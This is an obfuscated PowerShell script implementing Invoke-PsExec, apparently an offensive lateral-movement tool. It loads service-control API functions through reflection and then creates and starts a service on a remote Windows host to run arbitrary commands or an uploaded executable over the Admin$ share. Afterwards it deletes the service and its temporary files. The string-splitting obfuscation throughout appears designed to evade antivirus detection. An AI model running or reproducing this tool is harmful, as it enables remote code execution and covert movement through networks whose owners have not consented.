 &("{1}{2}{0}" -f'eM','sE','T-IT') VarIABle:Wt467  ([tYPE]("{2}{7}{6}{5}{3}{1}{0}{4}" -f 'RaCCe','uIlDe','SySte','Emblyb','Ss','.aSs','t','M.RefleCtiON.emi')  ) ;  $Kp0b = [tyPe]("{6}{2}{1}{4}{0}{5}{3}" -F 'lLiNGC','lECtiOn.','yStem.Ref','IonS','Ca','onvEnT','S') ;   &("{2}{0}{1}" -f 'Et-i','TeM','S')  variAbLE:49Q ([TyPe]("{3}{0}{1}{2}" -F 'pPD','OmAI','N','A') )  ; $NGal=[TYPe]("{3}{5}{4}{0}{7}{2}{8}{1}{6}"-f'TeROps','Rs','cEs.m','systEM.ruNtImE','IN','.','HaL','eRvi','A') ;function I`N`VOk`e-PS`EXEc {

    [CmdletBinding()]
    param(
        [Parameter(mandAtORy = ${TR`Ue})] 
        [String]
        ${COMPu`TE`RnA`mE},

        [String]
        ${Co`MMAND},

        [String]
        ${SeRVic`E`N`Ame} = ("{1}{0}{2}" -f'SV','Test','C'),

        [String]
        ${reSU`lT`F`ile},

        [String]
        ${S`erViCE`eXe},

        [switch]
        ${N`o`Clean`Up}
    )

    ${ERrORA`CTiON`Pre`FeR`ENcE} = ("{0}{1}" -f 'S','top')

    
    function Lo`Ca`l`:geT-RanDomSt`RIng 
    {
        param (
            [int]${len`GTh} = 12
        )
        ${S`et} = ("{10}{8}{5}{2}{3}{9}{7}{0}{4}{6}{1}"-f'xyzABCDEFG','UVWXYZ','ghijklmn','o','HIJKLMN','f','OPQRST','uvw','e','pqrst','abcd').("{2}{3}{0}{1}" -f 'a','y','ToCha','rArr').Invoke()
        ${r`Es`UlT} = ""
        for (${X} = 0; ${X} -lt ${Len`gtH}; ${X}++) {
            ${REs`U`lT} += ${S`Et} | &("{2}{1}{0}" -f'm','t-Rando','Ge')
        }
        ${r`EsuLt}
    }

    
    function L`oc`AL:ge`T-DeL`eGaTet`ype
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( POSITIoN = 0)]
            [Type[]]
            ${PAr`AMe`T`Ers} = (&("{0}{2}{1}"-f 'New','ect','-Obj') ("{1}{0}" -f ']','Type[')(0)),
            
            [Parameter( POSitiOn = 1 )]
            [Type]
            ${ret`UrNTY`pE} = [Void]
        )

        ${Do`m`AIn} =   (  &("{3}{1}{2}{0}"-f 'Ble','r','iA','gET-Va')  49Q -VAluE)::"cuRrEntd`O`MaIN"
        ${Dyn`A`sSem`BLY} = &("{1}{0}{2}" -f'w-Objec','Ne','t') ("{0}{5}{6}{2}{3}{4}{1}"-f'Syste','me','f','lection.Assembl','yNa','m.R','e')(("{0}{2}{1}{3}"-f'ReflectedD','ga','ele','te'))
        ${ASSE`MBl`YBUil`DER} = ${DOm`A`in}."dE`FinE`dYNAMi`CAS`sem`BLY"(${dyN`AssEMB`lY},   (&("{1}{2}{0}{3}" -f 'l','Ge','t-cHi','DITEM')  VArIAbLe:WT467).VAlue::"r`Un")
        ${mODuLe`Bu`i`lDEr} = ${A`SSe`MblYBU`IlDeR}.("{2}{4}{1}{5}{3}{0}"-f'le','neDyn','D','Modu','efi','amic').Invoke(("{2}{3}{1}{0}" -f'le','oryModu','I','nMem'), ${f`AlSe})
        ${t`yP`eBUI`LdEr} = ${mo`d`UlEbUIld`Er}.("{2}{0}{1}"-f'ef','ineType','D').Invoke(("{2}{0}{3}{1}" -f't','e','MyDelega','eTyp'), ("{2}{4}{0}{6}{7}{3}{9}{8}{1}{5}" -f',','s','Class, Pub','lass,','lic, Sealed','s',' Ansi','C','AutoCla',' '), [System.MulticastDelegate])
        ${CONSTrUC`Tor`BU`ilDer} = ${Typ`eBuI`LD`eR}.("{4}{2}{0}{3}{1}"-f 't','r','efineCons','ructo','D').Invoke(("{4}{6}{3}{7}{1}{8}{0}{5}{2}"-f 'ubl','me, HideBySig, ','c','p','RT','i','S','ecialNa','P'),  $kP0B::"ST`An`dard", ${PaRa`Mete`Rs})
        ${CONsTR`UC`TO`R`Bu`IldeR}.("{1}{4}{2}{3}{0}" -f 'ags','SetI','ementation','Fl','mpl').Invoke(("{3}{2}{0}{1}{4}" -f ', M','ana','e','Runtim','ged'))
        ${ME`Th`ODB`UIL`DeR} = ${TyP`E`BU`IldER}.("{2}{3}{0}{1}" -f 'o','d','Def','ineMeth').Invoke('Invoke', ("{0}{9}{6}{3}{5}{8}{7}{2}{1}{4}" -f'Pub',' Virtu','t,',',','al',' HideB','ic','ewSlo','ySig, N','l'), ${R`E`TURNt`yPE}, ${pa`Ramet`ers})
        ${MethoD`B`Ui`LdeR}.("{0}{5}{3}{6}{2}{1}{4}"-f'SetImplem','la','onF','a','gs','ent','ti').Invoke(("{3}{0}{1}{2}"-f'nag','e','d','Runtime, Ma'))
        
        &("{0}{1}{2}{3}" -f 'Wri','te-','Ou','tput') ${tyP`E`Bu`IldER}.("{2}{0}{1}"-f'eateTy','pe','Cr').Invoke()
    }

    
    function l`oCAl:GET-PR`ocadD`ReSS
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( pOSiTion = 0, mANdAtorY = ${t`RuE} )]
            [String]
            ${m`Od`UlE},
            
            [Parameter( PosItiOn = 1, MAnDAToRy = ${t`RUE} )]
            [String]
            ${p`RoCEDU`Re}
        )

        
        ${SYs`TeM`AS`sEmbLY} =  (&("{0}{2}{1}"-f'gE','-chiLDitEm','t') varIabLE:49q).ValuE::"Cu`RR`EnTd`oMa`iN".("{0}{2}{3}{1}" -f'G','blies','etAsse','m').Invoke() |
            &("{2}{0}{1}{3}"-f'here','-','W','Object') { ${_}."glOBala`sSEm`B`lY`CAChE" -And ${_}."LO`ca`Tion".("{0}{1}" -f 'Spli','t').Invoke('\\')[-1].("{1}{0}"-f 'ls','Equa').Invoke(("{1}{2}{0}" -f 'em.dll','S','yst')) }
        ${un`SaFEnAtiVEM`Eth`o`DS} = ${S`ystemAs`SEm`BLy}.("{0}{2}{1}"-f'G','tType','e').Invoke(("{1}{5}{2}{4}{0}{6}{3}" -f 'ativeMeth','Micro','ft.W','s','in32.UnsafeN','so','od'))
        
        ${Ge`TMOd`UL`eHAnDLE} = ${unSAfE`NaTIv`EME`Th`o`ds}.("{1}{0}{2}" -f 'o','GetMeth','d').Invoke(("{1}{3}{0}{2}" -f'uleHan','Ge','dle','tMod'))
        ${Getp`R`OcaD`dReSS} = ${uN`S`A`FenAtIveMETH`o`DS}.("{0}{1}{2}" -f'GetMeth','o','d').Invoke(("{4}{1}{3}{0}{2}" -f'ocAdd','e','ress','tPr','G'))
        
        ${K`e`Rn3`2h`ANdLE} = ${gEt`MOd`ULE`HAndle}."I`NvOkE"(${NU`Ll}, @(${mod`U`lE}))
        ${tM`pPTr} = &("{1}{0}{2}"-f'e','N','w-Object') ("{0}{1}" -f 'I','ntPtr')
        ${HAnDl`eR`eF} = &("{2}{0}{1}"-f '-','Object','New') ("{0}{4}{1}{2}{6}{7}{8}{5}{3}"-f'System.','opServic','es.H','f','Runtime.Inter','e','a','ndle','R')(${TMp`P`Tr}, ${KeRn32HA`ND`lE})
        
        
        &("{2}{3}{0}{1}"-f 'Out','put','W','rite-') ${GE`TPro`CadD`ResS}."i`NvOKE"(${n`UlL}, @([System.Runtime.InteropServices.HandleRef]${haN`Dl`eREF}, ${P`Roc`ed`URe}))
    }


    function lOC`Al`:InVoK`e`-pSExEcCmD
    {
        param(
            [Parameter(MaNdAtOry = ${t`RUE})] 
            [String]
            ${cO`MP`UtE`RN`Ame},

            [Parameter(mandAtOry = ${t`RUe})]
            [String]
            ${cOm`MA`Nd},

            [String]
            ${sErvic`eNA`me} = ("{1}{2}{0}" -f'C','T','estSV'),

            [switch]
            ${n`OC`LEaNuP}
        )

        
        
        ${c`losEseR`V`Ic`eHA`N`dLeAD`DR} = &("{3}{0}{2}{1}" -f '-Pr','Address','oc','Get') ("{2}{1}{0}{3}" -f'2.','pi3','Adva','dll') ("{3}{0}{4}{1}{2}"-f'e','rviceHa','ndle','Clos','Se')
        ${CLoSeSeRvicE`HA`NdLEDELe`gA`TE} = &("{4}{3}{2}{0}{1}"-f 'ateTyp','e','eg','Del','Get-') @( [IntPtr] ) ([Int])
        ${clO`seSe`RviCE`haN`dlE} =   ( &("{2}{1}{3}{0}" -f 'Le','-vA','gET','RiAB') ngAL  -vAlUEoN  )::("{2}{6}{0}{5}{4}{1}{3}"-f'legat','r','Get','FunctionPointer','Fo','e','De').Invoke(${cl`OSE`sErvIce`HaNDL`Ea`dDR}, ${C`LoSe`SErVIcEHA`N`dl`EDElEG`Ate})    

        ${OpEnS`C`m`A`Nag`eraAdDR} = &("{0}{3}{2}{1}"-f'Get-Pr','ss','cAddre','o') ("{1}{2}{0}"-f'.dll','A','dvapi32') ("{0}{1}{2}" -f 'Ope','nSCMa','nagerA')
        ${o`penScmaNageRaD`e`le`G`ATE} = &("{0}{3}{4}{1}{2}" -f 'Get-','a','teType','Del','eg') @( [String], [String], [Int]) ([IntPtr])
        ${o`pe`Nsc`M`ANAgerA} =  (&("{1}{2}{0}" -f 'IablE','V','AR')  ('nG'+'aL')  -Val)::("{2}{3}{4}{6}{0}{1}{5}{7}"-f 'unct','io','GetDe','legate','F','nP','orF','ointer').Invoke(${OpenscmaNAG`era`A`DDR}, ${o`PEN`ScmanagEraD`elEGA`TE})
        
        ${oPeNS`ErVIce`AAD`dr} = &("{3}{0}{2}{4}{1}" -f'e','ddress','t-Pro','G','cA') ("{0}{1}{2}" -f'Adv','api32.d','ll') ("{2}{0}{1}"-f'enService','A','Op')
        ${oPENSE`RVIc`EadEleG`A`Te} = &("{3}{1}{4}{2}{0}" -f 'pe','l','ateTy','Get-De','eg') @( [IntPtr], [String], [Int]) ([IntPtr])
        ${oPEnS`E`RvI`CEa} =  $NgAL::("{5}{1}{3}{8}{4}{0}{7}{6}{2}"-f 'nc','leg','nter','a','u','GetDe','i','tionPo','teForF').Invoke(${opeNserV`i`Ce`AADDR}, ${O`peNsER`V`IcEADelE`gATe})
      
        ${cReaTESErviC`ea`A`d`DR} = &("{0}{1}{2}{3}"-f 'Get-Pr','ocA','dd','ress') ("{1}{0}{2}" -f'dvapi3','A','2.dll') ("{0}{3}{4}{2}{1}"-f'C','A','ce','reateSer','vi')
        ${CRe`A`T`es`eR`VICeaDeLEG`ATe} = &("{2}{1}{0}{3}{4}"-f 'lega','e','Get-D','teT','ype') @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
        ${cRe`AteSE`Rv`Ic`Ea} =   (  &("{1}{2}{4}{3}{0}"-f'M','gEt-CHilD','i','e','T') vaRiaBlE:ngAl).VALUE::("{3}{5}{6}{2}{4}{1}{0}"-f 'ter','nPoin','ncti','GetDel','o','egat','eForFu').Invoke(${c`R`ea`TESeRvI`CeaADDr}, ${C`ReATEservIc`eADE`le`GATE})

        ${St`ARTserV`ice`AADDR} = &("{4}{1}{0}{2}{3}"-f'dd','cA','res','s','Get-Pro') ("{2}{0}{1}" -f'3','2.dll','Advapi') ("{4}{2}{3}{0}{1}"-f 'ervic','eA','ar','tS','St')
        ${stA`RtS`ErV`iceaDeL`Eg`AtE} = &("{3}{1}{0}{4}{2}" -f't-','e','teType','G','Delega') @( [IntPtr], [Int], [Int]) ([IntPtr])
        ${st`A`RtS`er`VICea} =   $ngAL::("{1}{6}{8}{0}{5}{3}{4}{7}{2}"-f 'e','GetDele','inter','unction','P','ForF','ga','o','t').Invoke(${sTAr`TSeRvi`C`ea`ADdR}, ${stA`R`T`se`RvicEa`dElEGa`Te})

        ${dELe`TEsER`VIcEA`dDR} = &("{0}{2}{1}{3}" -f 'G','Ad','et-Proc','dress') ("{3}{1}{2}{0}"-f 'dll','va','pi32.','Ad') ("{2}{3}{0}{1}"-f 'eteS','ervice','D','el')
        ${dE`let`eSER`VIc`edelEgate} = &("{0}{1}{2}"-f'Ge','t-Deleg','ateType') @( [IntPtr] ) ([IntPtr])
        ${De`LeT`E`sERVi`Ce} =   $nGAl::("{2}{1}{3}{4}{5}{0}" -f 'inter','eg','GetDel','ateF','orFunction','Po').Invoke(${de`LetEs`eRVI`Ceaddr}, ${deLEtES`ERV`i`C`eDeLE`GatE})

        ${geTLaST`ER`RORA`D`Dr} = &("{0}{2}{1}{3}" -f'Get-','rocA','P','ddress') ("{0}{1}{2}" -f 'Kernel','32','.dll') ("{2}{1}{3}{0}"-f 'r','tEr','GetLas','ro')
        ${GE`T`LasterRor`Dele`G`A`TE} = &("{2}{0}{1}{3}" -f 'Del','egate','Get-','Type') @() ([Int])
        ${gEtL`A`StErROr} =   $nGal::("{0}{5}{6}{2}{3}{7}{4}{1}"-f 'GetD','r','orF','u','nPointe','elega','teF','nctio').Invoke(${gE`Tla`steRRO`RaDDr}, ${g`e`TlAsTerrord`eL`Eg`Ate})

        
        
        
        
        ${mAN`A`G`ERha`NDlE} = ${OpENS`cM`A`NAGe`RA}."IN`VOkE"("\\$ComputerName", ("{2}{3}{1}{0}"-f've','vicesActi','Se','r'), 0xF003F)
        

        
        if (${mA`NAge`R`haN`dle} -and (${MaN`Age`RhaNdlE} -ne 0)){

            
            
            
            
            
            
            ${s`Er`VicEhaND`Le} = ${cReat`ESe`R`V`IceA}."iN`VOke"(${M`An`AgeR`hanD`Le}, ${sERV`Ice`N`Ame}, ${SerVIc`e`Na`me}, 0xF003F, 0x10, 0x3, 0x1, ${CO`MMand}, ${nu`lL}, ${N`UlL}, ${n`ULL}, ${NU`lL}, ${n`Ull})
            

            if (${s`ErV`ice`HAndle} -and (${sER`VI`c`ehA`NDLe} -ne 0)){

                

                
                
                ${T} = ${C`LosE`SeRViCEH`ANDLE}."in`Voke"(${s`ERvICEHAn`dle})

                
                
                ${s`ERV`iCeHAn`d`lE} = ${OPenS`ER`VICea}."INv`okE"(${mA`NA`g`ErhandLE}, ${seR`V`Ice`NAMe}, 0xF003F)
                

                if (${S`e`RvIc`EHaNDLe} -and (${SEr`ViCE`H`ANd`le} -ne 0)){

                    
                    
                    ${v`AL} = ${Sta`R`TseR`ViCEa}."I`NVoKe"(${s`eRViCeh`A`NDLE}, ${NU`lL}, ${NU`lL})

                    
                    if (${V`Al} -ne 0){
                        
                        
                        &("{2}{1}{0}" -f't-Sleep','ar','St') -s 1
                    }
                    else{
                        
                        ${E`RR} = ${GetLaS`T`Er`ROr}."I`NVOke"()
                        if (${E`RR} -eq 1053){
                            
                        }
                        else{
                            
                            ('['+'!] '+'Sta'+'rt'+'Se'+'rvice '+'fail'+'ed'+', '+'L'+'as'+'tError'+': '+"$err")
                        }
                        
                        &("{1}{0}{2}"-f 'art-Sle','St','ep') -s 1
                    }

                    if (-not ${N`oC`LeaNuP}) {
                        
                        
                        
                        ${v`AL} = ${deLe`TEs`Er`VICE}."I`Nvoke"(${Ser`VICE`haNdlE})
                        
                        if (${v`AL} -eq 0){
                            
                            ${e`Rr} = ${ge`TLAS`T`eRrOR}."In`Vo`Ke"()
                            
                        }
                        else{
                            
                        }
                    }
                    
                    
                    
                    ${V`Al} = ${c`L`oSeSE`RVicehaNd`Le}."In`Voke"(${sE`R`V`ic`eHaNdLE})
                    

                }
                else{
                    
                    ${e`RR} = ${Ge`TLA`sTe`R`Ror}."in`V`OkE"()
                    
                    ('[!'+'] '+'Op'+'en'+'S'+'erv'+'iceA '+'fa'+'iled,'+' '+'Last'+'Erro'+'r: '+"$err")
                }
            }

            else{
                
                ${e`RR} = ${GeTl`A`ST`ERROR}."in`VO`ke"()
                
                ('[!'+'] '+'Cre'+'at'+'eService '+'fai'+'led, '+'L'+'astError'+': '+"$err")
            }

            
            
            ${t} = ${cL`oSes`er`V`Ic`EHaNDlE}."InvO`KE"(${ManAgE`RHA`N`d`LE})
        }
        else{
            
            ${E`RR} = ${get`l`AsTErrOR}."i`NVoKE"()
            
            ('[!]'+' '+'OpenS'+'CMan'+'ag'+'er '+'fa'+'i'+'led, '+'LastErro'+'r:'+' '+"$err")
        }
    }

    if (${c`Om`MaND} -and (${coM`M`AND} -ne "")) { 

        if (${resu`ltf`ILE} -and (${r`E`SULT`FIlE} -ne "")) {
            

            
            ${te`mp`Te`Xt} = $(&("{0}{5}{3}{1}{4}{2}" -f 'Get','m','ng','ando','Stri','-R')) + ("{1}{0}"-f 't','.tx')
            ${TE`mpb`AT} = $(&("{0}{3}{1}{2}"-f 'G','-Rando','mString','et')) + ("{1}{0}"-f 'at','.b')

            
            ${C`MD} = ('%COMS'+'PEC%'+' '+'/'+'C '+'echo'+' '+"$Command "+'^>'+' '+"%systemroot%\Temp\$TempText "+'> '+"%systemroot%\Temp\$TempBat "+'& '+'%'+'COMS'+'PEC'+'% '+'/'+'C '+'s'+'tart'+' '+'%COMS'+'PEC%'+' '+'/'+'C '+"%systemroot%\Temp\$TempBat")

            

            try {
                
                ('['+'*] '+'Exe'+'c'+'uting '+'co'+'m'+'mand '+'and'+' '+'re'+'tr'+'i'+'eving '+'res'+'ults: '+"'$Command'")
                &("{0}{4}{1}{2}{3}"-f 'Inv','-P','sEx','ecCmd','oke') -ComputerName ${COMP`UTer`Name} -Command ${C`MD} -ServiceName ${ServICen`A`mE}

                
                ${r`em`OtEReSuLTF`ILe} = "\\$ComputerName\Admin$\Temp\$TempText"
                ('[*'+'] '+'Cop'+'ying '+'r'+'esu'+'lt '+'file'+' '+"$RemoteResultFile "+'to'+' '+"'$ResultFile'")
                &("{0}{1}{2}" -f 'Co','p','y-Item') -Force -Path ${rE`mOT`Er`E`sul`TFIle} -Destination ${R`E`sUltFI`LE}
                
                
                
                &("{0}{1}{2}" -f'Remove','-','Item') -Force ${RemO`TEr`Es`UL`TFiLe}

                
                &("{0}{2}{1}"-f'Remov','tem','e-I') -Force "\\$ComputerName\Admin$\Temp\$TempBat"
            }
            catch {
                
                ('Err'+'or'+': '+"$_")
            }
        }

        else {
            
            
            &("{0}{1}{2}" -f'I','nvoke-PsExecCm','d') -ComputerName ${CO`M`pU`TERNAmE} -Command ${cO`mMA`ND} -ServiceName ${sE`RVi`CenA`ME}
        }

    }

    elseif (${se`RvicEe`xE} -and (${s`E`RVIc`eeXe} -ne "")) {
        

        
        ${r`EMoTeUpl`OAd`pa`TH} = "\\$ComputerName\Admin$\$ServiceEXE"
        ('[*'+'] '+'Cop'+'yin'+'g '+'ser'+'vi'+'ce '+'bin'+'ar'+'y '+"$ServiceEXE "+'to'+' '+"'$RemoteUploadPath'")
        &("{1}{2}{0}"-f '-Item','C','opy') -Force -Path ${s`eR`VIcEE`Xe} -Destination ${RemoT`eU`PLoadpa`TH}

        if(-not ${n`oclE`A`NuP}) {
            
            ('[*]'+' '+'Ex'+'ecu'+'ting '+'servic'+'e'+' '+'.E'+'XE '+"'$RemoteUploadPath' "+'a'+'s '+'s'+'ervi'+'ce '+"'$ServiceName' "+'a'+'nd '+'c'+'leanin'+'g '+'up'+'.')
            &("{2}{0}{1}{3}"-f'nvoke','-PsExecCm','I','d') -ComputerName ${c`Omp`U`T`ErNamE} -Command ${RE`mOtE`UPl`OadpaTH} -ServiceName ${S`ErVICen`Ame}

            
            ('['+'*] '+'Rem'+'o'+'vin'+'g '+'the'+' '+'re'+'mo'+'te '+'se'+'r'+'vice '+'.EX'+'E '+"'$RemoteUploadPath'")
            &("{3}{1}{0}{2}"-f'Ite','emove-','m','R') -Path ${r`e`mo`TeuploAD`PATH} -Force
        }
        else {
            
           ('[*'+'] '+'Ex'+'ecuti'+'ng '+'serv'+'i'+'ce '+'.'+'EXE '+"'$RemoteUploadPath' "+'a'+'s '+'se'+'rvice'+' '+"'$ServiceName' "+'a'+'nd '+'no'+'t '+'cl'+'ean'+'ing '+'u'+'p.')
            &("{3}{1}{4}{5}{2}{0}" -f'cCmd','v','e-PsExe','In','o','k') -ComputerName ${cO`m`PUteRnamE} -Command ${remoTeu`p`loa`DP`ATh} -ServiceName ${SeRV`Ic`en`AMe} -NoCleanup
        }
    }

    else {
        
        
    }
}